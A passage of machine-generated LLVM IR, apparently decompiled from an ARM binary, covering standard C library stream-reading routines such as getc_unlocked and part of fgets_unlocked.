  %v3_16d4c = icmp uge i32 %v2_16d48, %v1_16d4c.pre
  store i1 %v3_16d4c, i1* %cpsr_c.global-to-local, align 1
  %v9_16d4c = icmp eq i32 %v2_16d48, %v1_16d4c.pre
  br i1 %v9_16d4c, label %dec_label_pc_16d54, label %dec_label_pc_16d6c

dec_label_pc_16d68:                               ; preds = %dec_label_pc_16d54
  %v0_16d68 = load i32, i32* @r4, align 4
  store i32 %v0_16d68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d6c

dec_label_pc_16d6c:                               ; preds = %dec_label_pc_16d3c, %dec_label_pc_16d54.dec_label_pc_16d48_crit_edge, %dec_label_pc_16d68
  %v0_16d74 = phi i32 [ %v0_16d68, %dec_label_pc_16d68 ], [ %v2_16d4898, %dec_label_pc_16d3c ], [ %v2_16d48, %dec_label_pc_16d54.dec_label_pc_16d48_crit_edge ]
  %v1_16d6c = phi i32 [ %v0_16d68, %dec_label_pc_16d68 ], [ %v3_16d3c, %dec_label_pc_16d3c ], [ %v1_16d4c.pre, %dec_label_pc_16d54.dec_label_pc_16d48_crit_edge ]
  %v3_16d6c = icmp uge i32 %v0_16d74, %v1_16d6c
  store i1 %v3_16d6c, i1* %cpsr_c.global-to-local, align 1
  %v9_16d6c = icmp eq i32 %v0_16d74, %v1_16d6c
  br i1 %v9_16d6c, label %dec_label_pc_16d74, label %dec_label_pc_16d6c.dec_label_pc_16d3c_crit_edge

dec_label_pc_16d6c.dec_label_pc_16d3c_crit_edge:  ; preds = %dec_label_pc_16d6c
  %v0_16d3c.pre = load i32, i32* @r5, align 4
  %v0_16d44.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16d3c

dec_label_pc_16d74:                               ; preds = %dec_label_pc_16d6c
  %v2_16d74 = icmp ne i32 %v1_16d6c, 0
  store i1 %v2_16d74, i1* %cpsr_c.global-to-local, align 1
  %v7_16d78 = icmp slt i32 %v1_16d6c, 2
  br i1 %v7_16d78, label %dec_label_pc_16d94, label %dec_label_pc_16d7c

dec_label_pc_16d7c:                               ; preds = %dec_label_pc_16d74
  %v0_16d7c = load i32, i32* @r5, align 4
  %v1_16d7c = add i32 %v0_16d7c, 56
  store i32 %v1_16d7c, i32* %r0.global-to-local, align 4
  %v0_16d80 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d80 = add i32 %v0_16d80, 129
  store i32 %v1_16d80, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d94

dec_label_pc_16d94:                               ; preds = %dec_label_pc_16d20, %dec_label_pc_16d7c, %dec_label_pc_16d74, %bb71, %dec_label_pc_16c5c
  %v0_16d94 = load i32, i32* @r5, align 4
  %v1_16d94 = add i32 %v0_16d94, 32
  %v2_16d94 = inttoptr i32 %v1_16d94 to i32*
  %v3_16d94 = load i32, i32* %v2_16d94, align 4
  store i32 %v3_16d94, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d98 = icmp eq i32 %v3_16d94, 0
  br i1 %v2_16d98, label %dec_label_pc_16da0, label %dec_label_pc_16c5c

dec_label_pc_16da0:                               ; preds = %dec_label_pc_16d94, %dec_label_pc_16c4c
  %v0_16da0 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_16da0, i32* %r0.global-to-local, align 4
  %v0_16ddc.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16da8:                               ; preds = %dec_label_pc_16a84
  %v3_16da8 = load i16, i16* %arg1, align 2
  %v4_16da8 = zext i16 %v3_16da8 to i32
  %v1_16dac = and i32 %v4_16da8, 64
  store i32 %v1_16dac, i32* %r3.global-to-local, align 4
  %v2_16dac = icmp eq i32 %v1_16dac, 0
  br i1 %v2_16dac, label %bb72, label %dec_label_pc_16db8

bb72:                                             ; preds = %dec_label_pc_16da8
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16db8:                               ; preds = %dec_label_pc_16da8
  %v2_16db8 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_16db8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16dbc = icmp eq i32 %v2_16db8, 0
  br i1 %v2_16dbc, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_16db8
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_16db8
  %v1_16dc0 = load i32, i32* @r4, align 4
  %v2_16dc0 = inttoptr i32 %v1_16dc0 to i16*
  %v3_16dc0 = load i16, i16* %v2_16dc0, align 2
  %v4_16dc0 = zext i16 %v3_16dc0 to i32
  store i32 %v4_16dc0, i32* %r3.global-to-local, align 4
  %v2_16dc4 = add i32 %v1_16dc0, 8
  %v3_16dc4 = inttoptr i32 %v2_16dc4 to i32*
  %v4_16dc4 = load i32, i32* %v3_16dc4, align 4
  store i32 %v4_16dc4, i32* %r2.global-to-local, align 4
  %v2_16dc8 = and i32 %v4_16dc0, 65471
  store i32 %v2_16dc8, i32* %r3.global-to-local, align 4
  %v2_16dcc = trunc i32 %v2_16dc8 to i16
  store i16 %v2_16dcc, i16* %v2_16dc0, align 2
  %v1_16dd0 = load i32, i32* %r2.global-to-local, align 4
  %v2_16dd0 = load i32, i32* @r4, align 4
  %v3_16dd0 = add i32 %v2_16dd0, 28
  %v4_16dd0 = inttoptr i32 %v3_16dd0 to i32*
  store i32 %v1_16dd0, i32* %v4_16dd0, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_16da0, %.thread14
  %v0_16ddc = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_16ddc.pre, %dec_label_pc_16da0 ], [ 0, %.thread14 ]
  store i32 %v0_16ddc, i32* %r0.global-to-local, align 4
  store i32 %v6_16a58, i32* %r5.global-to-local, align 4
  ret i32 %v0_16ddc

; uselistorder directives
  uselistorder i32 %v0_16ddc, { 1, 0 }
  uselistorder i32 %v3_16d94, { 1, 2, 0 }
  uselistorder i32 %v0_16d68, { 1, 0, 2 }
  uselistorder i32 %v1_16d4c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16cec, { 1, 0, 2 }
  uselistorder i32 %v0_16cb4, { 1, 0, 2 }
  uselistorder i32 %v1_16c98.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16c7c, { 1, 0 }
  uselistorder i32 %v0_16c20, { 1, 0, 2 }
  uselistorder i32 %v1_16c04.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16bf4, { 1, 0 }
  uselistorder i32 %v0_16bb8, { 1, 0, 2 }
  uselistorder i32 %v1_16b9c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16b84, { 1, 0 }
  uselistorder i32 %v0_16b4c, { 1, 0, 2 }
  uselistorder i32 %v1_16b30.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16b20, { 1, 0 }
  uselistorder i32 %v0_16adc, { 1, 0, 2 }
  uselistorder i32 %v1_16ac0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16a98, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 9, 8, 55, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 53, 22, 23, 24, 25, 26, 27, 29, 28, 0, 30, 31, 32, 33, 35, 34, 1, 36, 37, 38, 39, 41, 40, 54, 42, 43, 44, 45, 47, 46, 2, 48, 49, 52, 50, 51 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 14, 4, 5, 6, 39, 40, 7, 8, 9, 10, 11, 36, 37, 12, 13, 38, 15, 16, 18, 17, 0, 19, 20, 22, 21, 1, 23, 24, 25, 27, 26, 2, 28, 29, 30, 34, 35, 31, 32, 33 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 32, 26, 27, 28, 29, 30, 31 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16d94, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_16d6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16d54, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16cd4, { 1, 0 }
  uselistorder label %dec_label_pc_16cc8, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_16cb8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ca0, { 1, 0 }
  uselistorder label %dec_label_pc_16c5c, { 1, 0 }
  uselistorder label %dec_label_pc_16c4cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_16c24, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16c0c, { 1, 0 }
  uselistorder label %dec_label_pc_16bcc, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_16bbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ba4, { 1, 0 }
  uselistorder label %dec_label_pc_16b78, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16b50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16b38, { 1, 0 }
  uselistorder label %dec_label_pc_16af0, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_16ae0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ac8, { 1, 0 }
  uselistorder label %dec_label_pc_16a94, { 1, 0 }
}

define i32 @function_16df0(i32 %arg1) local_unnamed_addr {
dec_label_pc_16df0:
  %v0_16df0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16df0, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_16df0
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16df0, %bb
  %v10_16e00 = phi i32 [ %arg1, %dec_label_pc_16df0 ], [ 0, %bb ]
  ret i32 %v10_16e00

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_16e04 = load i32, i32* @r4, align 4
  store i32 %v3_16e04, i32* %stack_var_-12, align 4
  %v6_16e04 = load i32, i32* @r5, align 4
  %v9_16e04 = load i32, i32* @lr, align 4
  %v0_16e08 = load i32, i32* @r0, align 4
  %v1_16e08 = add i32 %v0_16e08, 16
  %v2_16e08 = inttoptr i32 %v1_16e08 to i32*
  %v3_16e08 = load i32, i32* %v2_16e08, align 4
  store i32 %v3_16e08, i32* %r2.global-to-local, align 4
  %v1_16e0c = add i32 %v0_16e08, 24
  %v2_16e0c = inttoptr i32 %v1_16e0c to i32*
  %v3_16e0c = load i32, i32* %v2_16e0c, align 4
  %v3_16e10 = icmp ult i32 %v3_16e08, %v3_16e0c
  store i32 %v0_16e08, i32* @r4, align 4
  br i1 %v3_16e10, label %bb, label %dec_label_pc_16e30

bb:                                               ; preds = %entry
  %v2_16e1c = inttoptr i32 %v3_16e08 to i8*
  %v3_16e1c = load i8, i8* %v2_16e1c, align 1
  %v4_16e1c = zext i8 %v3_16e1c to i32
  store i32 %v4_16e1c, i32* %r0.global-to-local, align 4
  %v6_16e1c = add i32 %v3_16e08, 1
  store i32 %v6_16e1c, i32* %r2.global-to-local, align 4
  store i32 %v6_16e1c, i32* %v2_16e08, align 4
  br label %dec_label_pc_16f1c

dec_label_pc_16e30:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r5, align 4
  %v1_16e30 = inttoptr i32 %v0_16e08 to i16*
  %v2_16e30 = load i16, i16* %v1_16e30, align 2
  %v3_16e30 = zext i16 %v2_16e30 to i32
  %v1_16e34 = and i32 %v3_16e30, 131
  %tmp25 = icmp ugt i32 %v1_16e34, 128
  br i1 %tmp25, label %dec_label_pc_16e50, label %dec_label_pc_16e40

dec_label_pc_16e40:                               ; preds = %dec_label_pc_16e30
  store i32 128, i32* @r1, align 4
  %v0_16e44 = call i32 @__stdio_trans2r_o()
  store i32 %v0_16e44, i32* %r0.global-to-local, align 4
  %v2_16e48 = icmp eq i32 %v0_16e44, 0
  br i1 %v2_16e48, label %dec_label_pc_16e40.dec_label_pc_16e50_crit_edge, label %dec_label_pc_16f18

dec_label_pc_16e40.dec_label_pc_16e50_crit_edge:  ; preds = %dec_label_pc_16e40
  %v0_16e50.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16e50

dec_label_pc_16e50:                               ; preds = %dec_label_pc_16e40.dec_label_pc_16e50_crit_edge, %dec_label_pc_16e30
  %v2_16e90 = phi i32 [ %v0_16e50.pre, %dec_label_pc_16e40.dec_label_pc_16e50_crit_edge ], [ %v0_16e08, %dec_label_pc_16e30 ]
  %v1_16e50 = inttoptr i32 %v2_16e90 to i16*
  %v2_16e50 = load i16, i16* %v1_16e50, align 2
  %v3_16e50 = zext i16 %v2_16e50 to i32
  store i32 %v3_16e50, i32* %r2.global-to-local, align 4
  %v1_16e54 = and i32 %v3_16e50, 2
  %v2_16e54 = icmp eq i32 %v1_16e54, 0
  br i1 %v2_16e54, label %dec_label_pc_16e80, label %dec_label_pc_16e5c

dec_label_pc_16e5c:                               ; preds = %dec_label_pc_16e50
  %tmp26 = urem i16 %v2_16e50, 2
  %v1_16e5c = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_16e5c
  %v4_16e60 = and i32 %tmp22, 4
  %v5_16e60 = add i32 %v4_16e60, %v2_16e90
  %v1_16e64 = add i32 %v5_16e60, 36
  %v2_16e64 = inttoptr i32 %v1_16e64 to i8*
  %v3_16e64 = load i8, i8* %v2_16e64, align 1
  %v4_16e64 = zext i8 %v3_16e64 to i32
  %v1_16e68 = add nsw i32 %v3_16e50, -1
  store i32 %v1_16e68, i32* %r2.global-to-local, align 4
  store i32 %v4_16e64, i32* %r0.global-to-local, align 4
  %v2_16e74 = add i32 %v2_16e90, 40
  %v3_16e74 = inttoptr i32 %v2_16e74 to i32*
  store i32 0, i32* %v3_16e74, align 4
  %v0_16e78 = load i32, i32* %r2.global-to-local, align 4
  %v1_16e78 = trunc i32 %v0_16e78 to i16
  %v2_16e78 = load i32, i32* @r4, align 4
  %v3_16e78 = inttoptr i32 %v2_16e78 to i16*
  store i16 %v1_16e78, i16* %v3_16e78, align 2
  br label %dec_label_pc_16f1c

dec_label_pc_16e80:                               ; preds = %dec_label_pc_16e50
  %v1_16e80 = add i32 %v2_16e90, 16
  %v1_16e84 = inttoptr i32 %v1_16e80 to i32*
  %v2_16e84 = load i32, i32* %v1_16e84, align 4
  store i32 %v2_16e84, i32* @r1, align 4
  %v3_16e84 = add i32 %v2_16e90, 20
  %v4_16e84 = inttoptr i32 %v3_16e84 to i32*
  %v5_16e84 = load i32, i32* %v4_16e84, align 4
  %v9_16e88 = icmp eq i32 %v5_16e84, %v2_16e84
  br i1 %v9_16e88, label %dec_label_pc_16e98, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16e80
  %v2_16e8c = inttoptr i32 %v2_16e84 to i8*
  %v3_16e8c = load i8, i8* %v2_16e8c, align 1
  %v4_16e8c = zext i8 %v3_16e8c to i32
  store i32 %v4_16e8c, i32* %r0.global-to-local, align 4
  %v6_16e8c = add i32 %v2_16e84, 1
  store i32 %v6_16e8c, i32* @r1, align 4
  store i32 %v6_16e8c, i32* %v1_16e84, align 4
  br label %dec_label_pc_16f1c

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16e80
  %v1_16e98 = add i32 %v2_16e90, 4
  %v2_16e98 = inttoptr i32 %v1_16e98 to i32*
  %v3_16e98 = load i32, i32* %v2_16e98, align 4
  %v7_16e9c = icmp eq i32 %v3_16e98, -2
  br i1 %v7_16e9c, label %.thread7, label %dec_label_pc_16eb0

.thread7:                                         ; preds = %dec_label_pc_16e98
  %v2_16ea0 = or i16 %v2_16e50, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_16ea0, i16* %v1_16e50, align 2
  br label %dec_label_pc_16f1c

dec_label_pc_16eb0:                               ; preds = %dec_label_pc_16e98
  %v1_16eb0 = and i32 %v3_16e50, 768
  %v2_16eb0 = icmp eq i32 %v1_16eb0, 0
  br i1 %v2_16eb0, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_16eb0
  %v1_16eb8 = load i32, i32* @r5, align 4
  %v3_16eb8 = add i32 %v1_16eb8, 76
  %v4_16eb8 = inttoptr i32 %v3_16eb8 to i32*
  %v5_16eb8 = load i32, i32* %v4_16eb8, align 4
  store i32 %v5_16eb8, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16eb0, %bb23
  store i32 93888, i32* @lr, align 4
  %v1_16ebc = xor i1 %v2_16eb0, true
  call void @__pseudo_cond_branch(i1 %v1_16ebc, i32 ptrtoint (i32* @global_var_16a58.601 to i32))
  %v0_16ec0 = load i32, i32* @r4, align 4
  %v1_16ec0 = add i32 %v0_16ec0, 8
  store i32 %v1_16ec0, i32* %r2.global-to-local, align 4
  %v1_16ec4 = inttoptr i32 %v1_16ec0 to i32*
  %v2_16ec4 = load i32, i32* %v1_16ec4, align 4
  store i32 %v2_16ec4, i32* %r2.global-to-local, align 4
  %v3_16ec4 = add i32 %v0_16ec0, 12
  %v4_16ec4 = inttoptr i32 %v3_16ec4 to i32*
  %v5_16ec4 = load i32, i32* %v4_16ec4, align 4
  %v9_16ec8 = icmp eq i32 %v5_16ec4, %v2_16ec4
  br i1 %v9_16ec8, label %dec_label_pc_16efc, label %dec_label_pc_16ed0

dec_label_pc_16ed0:                               ; preds = %.thread9
  %v2_16ed0 = add i32 %v0_16ec0, 24
  %v3_16ed0 = inttoptr i32 %v2_16ed0 to i32*
  store i32 %v2_16ec4, i32* %v3_16ed0, align 4
  %v0_16ed4 = load i32, i32* @r4, align 4
  store i32 %v0_16ed4, i32* %r0.global-to-local, align 4
  %v2_16ed8 = call i32 @__stdio_rfill(i32 %v0_16ed4)
  store i32 %v2_16ed8, i32* %r0.global-to-local, align 4
  %v2_16edc = icmp eq i32 %v2_16ed8, 0
  br i1 %v2_16edc, label %dec_label_pc_16f18, label %dec_label_pc_16ee4

dec_label_pc_16ee4:                               ; preds = %dec_label_pc_16ed0
  %v0_16ee4 = load i32, i32* @r4, align 4
  %v1_16ee4 = add i32 %v0_16ee4, 20
  %v2_16ee4 = inttoptr i32 %v1_16ee4 to i32*
  %v3_16ee4 = load i32, i32* %v2_16ee4, align 4
  %v2_16ee8 = add i32 %v0_16ee4, 24
  %v3_16ee8 = inttoptr i32 %v2_16ee8 to i32*
  store i32 %v3_16ee4, i32* %v3_16ee8, align 4
  %v0_16eec = load i32, i32* @r4, align 4
  %v1_16eec = add i32 %v0_16eec, 16
  %v2_16eec = inttoptr i32 %v1_16eec to i32*
  %v3_16eec = load i32, i32* %v2_16eec, align 4
  %v1_16ef0 = inttoptr i32 %v3_16eec to i8*
  %v2_16ef0 = load i8, i8* %v1_16ef0, align 1
  %v3_16ef0 = zext i8 %v2_16ef0 to i32
  store i32 %v3_16ef0, i32* %r0.global-to-local, align 4
  %v5_16ef0 = add i32 %v3_16eec, 1
  store i32 %v5_16ef0, i32* %v2_16eec, align 4
  br label %dec_label_pc_16f1c

dec_label_pc_16efc:                               ; preds = %.thread9
  %v1_16efc = inttoptr i32 %v0_16ec0 to i16*
  store i32 %v0_16ec0, i32* %r0.global-to-local, align 4
  %v2_16f00 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_16f00, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_16f08 = call i32 @__stdio_READ(i16* %v1_16efc, i32 %v2_16f00, i32 1)
  store i32 %v5_16f08, i32* %r0.global-to-local, align 4
  %v2_16f0c = icmp eq i32 %v5_16f08, 0
  br i1 %v2_16f0c, label %dec_label_pc_16f18, label %bb24

bb24:                                             ; preds = %dec_label_pc_16efc
  %v4_16f10 = load i8, i8* %stack_var_-17, align 1
  %v5_16f10 = sext i8 %v4_16f10 to i32
  store i32 %v5_16f10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f1c

dec_label_pc_16f18:                               ; preds = %dec_label_pc_16efc, %dec_label_pc_16e40, %dec_label_pc_16ed0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f1c

dec_label_pc_16f1c:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_16ee4, %dec_label_pc_16e5c, %dec_label_pc_16f18
  %v2_16f20 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16f20, i32* @r4, align 4
  store i32 %v6_16e04, i32* @r5, align 4
  store i32 %v9_16e04, i32* @lr, align 4
  %v1_16f24 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16f24

; uselistorder directives
  uselistorder i32 %v2_16e84, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16e90, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_16e08, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_16f1c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_16f18, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_16f30 = load i32, i32* @r6, align 4
  %v12_16f30 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16f34 = icmp eq i32 %arg2, 0
  store i1 %v2_16f34, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_16fbc, label %dec_label_pc_16fa4.preheader

dec_label_pc_16fa4.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_16fa42 = add i32 %arg2, -1
  store i32 %v1_16fa42, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_16fa48 = icmp eq i32 %arg2, 1
  store i1 %v7_16fa48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16fa48, label %dec_label_pc_16fac, label %dec_label_pc_16f50

dec_label_pc_16f50:                               ; preds = %dec_label_pc_16fa4.preheader, %dec_label_pc_16fa4.backedge.dec_label_pc_16f50_crit_edge
  %v0_16f74 = phi i32 [ %v0_16f50.pre, %dec_label_pc_16fa4.backedge.dec_label_pc_16f50_crit_edge ], [ %arg3, %dec_label_pc_16fa4.preheader ]
  %v1_16f50 = add i32 %v0_16f74, 16
  %v2_16f50 = inttoptr i32 %v1_16f50 to i32*
  %v3_16f50 = load i32, i32* %v2_16f50, align 4
  store i32 %v3_16f50, i32* %r2.global-to-local, align 4
  %v1_16f54 = add i32 %v0_16f74, 24
  %v2_16f54 = inttoptr i32 %v1_16f54 to i32*
  %v3_16f54 = load i32, i32* %v2_16f54, align 4
  store i32 %v3_16f54, i32* %r3.global-to-local, align 4
  %v3_16f58 = icmp uge i32 %v3_16f50, %v3_16f54
  store i1 %v3_16f58, i1* %cpsr_c.global-to-local, align 1
  %v9_16f58 = icmp eq i32 %v3_16f50, %v3_16f54
  store i1 %v9_16f58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16f58, label %dec_label_pc_16f74, label %dec_label_pc_16f60

dec_label_pc_16f60:                               ; preds = %dec_label_pc_16f50
  %v1_16f60 = inttoptr i32 %v3_16f50 to i8*
  %v2_16f60 = load i8, i8* %v1_16f60, align 1
  %v3_16f60 = zext i8 %v2_16f60 to i32
  store i32 %v3_16f60, i32* %r3.global-to-local, align 4
  %v5_16f60 = add i32 %v3_16f50, 1
  store i32 %v5_16f60, i32* %r2.global-to-local, align 4
  %v2_16f64 = load i32, i32* @r5, align 4
  %v3_16f64 = inttoptr i32 %v2_16f64 to i8*
  store i8 %v2_16f60, i8* %v3_16f64, align 1
  %v4_16f64 = load i32, i32* @r5, align 4
  %v5_16f64 = add i32 %v4_16f64, 1
  store i32 %v5_16f64, i32* @r5, align 4
  %v0_16f68 = load i32, i32* %r3.global-to-local, align 4
  %v2_16f68 = icmp ugt i32 %v0_16f68, 9
  store i1 %v2_16f68, i1* %cpsr_c.global-to-local, align 1
  %v7_16f68 = icmp eq i32 %v0_16f68, 10
  store i1 %v7_16f68, i1* %cpsr_z.global-to-local, align 1
  %v0_16f6c = load i32, i32* %r2.global-to-local, align 4
  %v1_16f6c = load i32, i32* @r4, align 4
  %v2_16f6c = add i32 %v1_16f6c, 16
  %v3_16f6c = inttoptr i32 %v2_16f6c to i32*
  store i32 %v0_16f6c, i32* %v3_16f6c, align 4
  br i1 %v7_16f68, label %dec_label_pc_16fac, label %dec_label_pc_16fa4.backedge

dec_label_pc_16f74:                               ; preds = %dec_label_pc_16f50
  %v1_16f74 = inttoptr i32 %v0_16f74 to i16*
  %v3_16f78 = call i32 @getc_unlocked(i16* %v1_16f74)
  %v3_16f7c = icmp eq i32 %v3_16f78, -1
  store i1 %v3_16f7c, i1* %cpsr_c.global-to-local, align 1
  %v8_16f7c = icmp eq i32 %v3_16f78, -1
  store i1 %v8_16f7c, i1* %cpsr_z.global-to-local, align 1
  %v1_16f80 = urem i32 %v3_16f78, 256
  store i32 %v1_16f80, i32* %r3.global-to-local, align 4
  br i1 %v3_16f7c, label %dec_label_pc_16f88, label %dec_label_pc_16fa0

dec_label_pc_16f88:                               ; preds = %dec_label_pc_16f74
  %v0_16f88 = load i32, i32* @r4, align 4
  %v1_16f88 = inttoptr i32 %v0_16f88 to i16*
  %v2_16f88 = load i16, i16* %v1_16f88, align 2
  %v3_16f88 = zext i16 %v2_16f88 to i32
  store i32 %v3_16f88, i32* %r3.global-to-local, align 4
  %v1_16f8c = and i32 %v3_16f88, 8
  %v2_16f8c = icmp eq i32 %v1_16f8c, 0
  store i1 %v2_16f8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16f8c, label %dec_label_pc_16fac, label %dec_label_pc_16fbc

dec_label_pc_16fa0:                               ; preds = %dec_label_pc_16f74
  %v1_16f98 = trunc i32 %v3_16f78 to i8
  %v2_16f98 = load i32, i32* @r5, align 4
  %v3_16f98 = inttoptr i32 %v2_16f98 to i8*
  store i8 %v1_16f98, i8* %v3_16f98, align 1
  %v4_16f98 = load i32, i32* @r5, align 4
  %v5_16f98 = add i32 %v4_16f98, 1
  store i32 %v5_16f98, i32* @r5, align 4
  %v0_16f9c = load i32, i32* %r3.global-to-local, align 4
  %v2_16f9c = icmp ugt i32 %v0_16f9c, 9
  store i1 %v2_16f9c, i1* %cpsr_c.global-to-local, align 1
  %v7_16f9c = icmp eq i32 %v0_16f9c, 10
  store i1 %v7_16f9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16f9c, label %dec_label_pc_16fac, label %dec_label_pc_16fa4.backedge

dec_label_pc_16fa4.backedge:                      ; preds = %dec_label_pc_16fa0, %dec_label_pc_16f60
  %v0_16fa4 = load i32, i32* @r6, align 4
  %v1_16fa4 = add i32 %v0_16fa4, -1
  store i32 %v1_16fa4, i32* @r6, align 4
  %v2_16fa4 = icmp ne i32 %v0_16fa4, 0
  store i1 %v2_16fa4, i1* %cpsr_c.global-to-local, align 1
  %v7_16fa4 = icmp eq i32 %v0_16fa4, 1
  store i1 %v7_16fa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16fa4, label %dec_label_pc_16fac, label %dec_label_pc_16fa4.backedge.dec_label_pc_16f50_crit_edge

